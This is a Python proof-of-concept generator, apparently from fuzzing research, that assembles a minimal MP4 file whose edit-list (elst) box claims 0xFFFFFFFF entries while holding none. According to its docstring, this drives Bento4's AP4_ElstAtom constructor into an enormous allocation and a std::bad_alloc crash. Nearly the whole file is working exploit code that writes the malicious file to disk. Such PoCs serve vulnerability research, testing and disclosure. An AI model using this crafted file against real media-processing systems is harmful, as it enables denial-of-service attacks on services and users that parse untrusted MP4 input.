#!/usr/bin/env python3
"""
vuln_002_gen.py - PoC generator for Bento4 AP4_ElstAtom entry_count bounds check vulnerability.

Crafts a minimal MP4 with an elst box containing entry_count=0xFFFFFFFF.
The small box size (20 bytes) means the stream has no actual entries,
but the constructor still calls EnsureCapacity(0xFFFFFFFF) before reading,
triggering ~80GB allocation → std::bad_alloc crash.
"""

import struct
import os

OUTPUT = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4Interfaces_h/vuln_002.mp4"


def box(box_type: bytes, payload: bytes) -> bytes:
    """Build a 4-byte-size + 4-byte-type + payload box."""
    size = 8 + len(payload)
    return struct.pack(">I", size) + box_type + payload


# ---------------------------------------------------------------------------
# ftyp  (file type box)
# ---------------------------------------------------------------------------
ftyp_payload = (
    b"M4A "                        # major_brand
    + struct.pack(">I", 0)         # minor_version
    + b"M4A " + b"mp42" + b"isom" # compatible_brands
)
ftyp = box(b"ftyp", ftyp_payload)

# ---------------------------------------------------------------------------
# elst  (edit list) — the trigger
#   size=20: 4 size + 4 type + 4 version/flags + 4 entry_count
#   entry_count=0xFFFFFFFF but NO entries follow → EnsureCapacity blows up
# ---------------------------------------------------------------------------
elst_payload = (
    struct.pack(">I", 0)           # version(1B)=0 + flags(3B)=0
    + struct.pack(">I", 0xFFFFFFFF) # entry_count — the lie
    # no entries
)
elst = box(b"elst", elst_payload)

# ---------------------------------------------------------------------------
# edts  (edit box)
# ---------------------------------------------------------------------------
edts = box(b"edts", elst)

# ---------------------------------------------------------------------------
# tkhd  (track header)
# ---------------------------------------------------------------------------
tkhd_payload = (
    struct.pack(">I", 0x00000003)  # version=0, flags=track_enabled|track_in_movie
    + struct.pack(">I", 0)         # creation_time
    + struct.pack(">I", 0)         # modification_time
    + struct.pack(">I", 1)         # track_id
    + struct.pack(">I", 0)         # reserved
    + struct.pack(">I", 1000)      # duration (in mvhd timescale units)
    + struct.pack(">Q", 0)         # reserved (8 bytes)
    + struct.pack(">HH", 0, 0)     # layer, alternate_group
    + struct.pack(">H", 0x0100)    # volume (1.0 for audio)
    + struct.pack(">H", 0)         # reserved
    + struct.pack(">IIIIIIIII", 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)  # matrix
    + struct.pack(">II", 0, 0)     # width, height
)
tkhd = box(b"tkhd", tkhd_payload)

# ---------------------------------------------------------------------------
# mdhd  (media header)
# ---------------------------------------------------------------------------
mdhd_payload = (
    struct.pack(">I", 0)           # version=0, flags=0
    + struct.pack(">I", 0)         # creation_time
    + struct.pack(">I", 0)         # modification_time
    + struct.pack(">I", 44100)     # timescale (44100 Hz for audio)
    + struct.pack(">I", 44100)     # duration (1 second)
    + struct.pack(">H", 0x55C4)    # language (und)
    + struct.pack(">H", 0)         # pre_defined
)
mdhd = box(b"mdhd", mdhd_payload)

# ---------------------------------------------------------------------------
# hdlr  (handler box — audio handler)
# ---------------------------------------------------------------------------
hdlr_payload = (
    struct.pack(">I", 0)           # version=0, flags=0
    + struct.pack(">I", 0)         # pre_defined
    + b"soun"                      # handler_type = sound
    + struct.pack(">III", 0, 0, 0) # reserved
    + b"SoundHandler\x00"          # name
)
hdlr = box(b"hdlr", hdlr_payload)

# ---------------------------------------------------------------------------
# smhd  (sound media header)
# ---------------------------------------------------------------------------
smhd_payload = struct.pack(">I", 0) + struct.pack(">HH", 0, 0)  # version/flags, balance, reserved
smhd = box(b"smhd", smhd_payload)

# ---------------------------------------------------------------------------
# dref  (data reference box — points to self)
# ---------------------------------------------------------------------------
url_payload = struct.pack(">I", 0x00000001)  # version/flags: self-contained
url_box = box(b"url ", url_payload)

dref_payload = struct.pack(">I", 0) + struct.pack(">I", 1) + url_box  # version/flags, entry_count
dref = box(b"dref", dref_payload)

dinf = box(b"dinf", dref)

# ---------------------------------------------------------------------------
# stsd  (sample description — minimal mp4a entry)
# ---------------------------------------------------------------------------
# We build a bare-bones mp4a sample entry
mp4a_payload = (
    struct.pack(">6B", 0, 0, 0, 0, 0, 0)  # reserved
    + struct.pack(">H", 1)                 # data_reference_index
    + struct.pack(">8B", 0,0,0,0,0,0,0,0) # reserved
    + struct.pack(">H", 2)                 # channelcount
    + struct.pack(">H", 16)                # samplesize
    + struct.pack(">H", 0)                 # pre_defined
    + struct.pack(">H", 0)                 # reserved
    + struct.pack(">I", 44100 << 16)       # samplerate (fixed-point 16.16)
)
mp4a = box(b"mp4a", mp4a_payload)
stsd_payload = struct.pack(">I", 0) + struct.pack(">I", 1) + mp4a  # version/flags, entry_count
stsd = box(b"stsd", stsd_payload)

# ---------------------------------------------------------------------------
# stts  (time-to-sample — minimal: 1 entry mapping all samples to 1024 duration)
# ---------------------------------------------------------------------------
stts_payload = (
    struct.pack(">I", 0)            # version/flags
    + struct.pack(">I", 1)          # entry_count
    + struct.pack(">II", 1, 1024)   # sample_count, sample_delta
)
stts = box(b"stts", stts_payload)

# ---------------------------------------------------------------------------
# stsc  (sample-to-chunk — minimal: 1 entry)
# ---------------------------------------------------------------------------
stsc_payload = (
    struct.pack(">I", 0)                 # version/flags
    + struct.pack(">I", 1)               # entry_count
    + struct.pack(">III", 1, 1, 1)       # first_chunk, samples_per_chunk, sample_description_index
)
stsc = box(b"stsc", stsc_payload)

# ---------------------------------------------------------------------------
# stsz  (sample sizes — minimal: 1 sample of size 0)
# ---------------------------------------------------------------------------
stsz_payload = (
    struct.pack(">I", 0)            # version/flags
    + struct.pack(">I", 0)          # sample_size (0 = variable)
    + struct.pack(">I", 1)          # sample_count
    + struct.pack(">I", 0)          # entry_size[0]
)
stsz = box(b"stsz", stsz_payload)

# ---------------------------------------------------------------------------
# stco  (chunk offset — minimal: 1 chunk at offset 0)
# ---------------------------------------------------------------------------
stco_payload = (
    struct.pack(">I", 0)            # version/flags
    + struct.pack(">I", 1)          # entry_count
    + struct.pack(">I", 0)          # chunk_offset[0]
)
stco = box(b"stco", stco_payload)

# ---------------------------------------------------------------------------
# stbl  (sample table)
# ---------------------------------------------------------------------------
stbl = box(b"stbl", stsd + stts + stsc + stsz + stco)

# ---------------------------------------------------------------------------
# minf  (media information)
# ---------------------------------------------------------------------------
minf = box(b"minf", smhd + dinf + stbl)

# ---------------------------------------------------------------------------
# mdia  (media)
# ---------------------------------------------------------------------------
mdia = box(b"mdia", mdhd + hdlr + minf)

# ---------------------------------------------------------------------------
# trak  (track): tkhd + edts + mdia
# ---------------------------------------------------------------------------
trak = box(b"trak", tkhd + edts + mdia)

# ---------------------------------------------------------------------------
# mvhd  (movie header)
# ---------------------------------------------------------------------------
mvhd_payload = (
    struct.pack(">I", 0)            # version=0, flags=0
    + struct.pack(">I", 0)          # creation_time
    + struct.pack(">I", 0)          # modification_time
    + struct.pack(">I", 1000)       # timescale
    + struct.pack(">I", 1000)       # duration
    + struct.pack(">I", 0x00010000) # rate (1.0)
    + struct.pack(">H", 0x0100)     # volume (1.0)
    + struct.pack(">H", 0)          # reserved
    + struct.pack(">II", 0, 0)      # reserved
    + struct.pack(">IIIIIIIII",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)           # matrix
    + struct.pack(">6I", 0, 0, 0, 0, 0, 0)  # pre_defined
    + struct.pack(">I", 2)          # next_track_id
)
mvhd = box(b"mvhd", mvhd_payload)

# ---------------------------------------------------------------------------
# moov  (movie container)
# ---------------------------------------------------------------------------
moov = box(b"moov", mvhd + trak)

# ---------------------------------------------------------------------------
# Assemble and write
# ---------------------------------------------------------------------------
mp4_data = ftyp + moov

os.makedirs(os.path.dirname(OUTPUT), exist_ok=True)
with open(OUTPUT, "wb") as f:
    f.write(mp4_data)

print(f"[+] Written {len(mp4_data)} bytes to {OUTPUT}")
print(f"[+] elst entry_count = 0xFFFFFFFF ({0xFFFFFFFF})")
print(f"[+] elst box size = 20 bytes (no actual entries)")
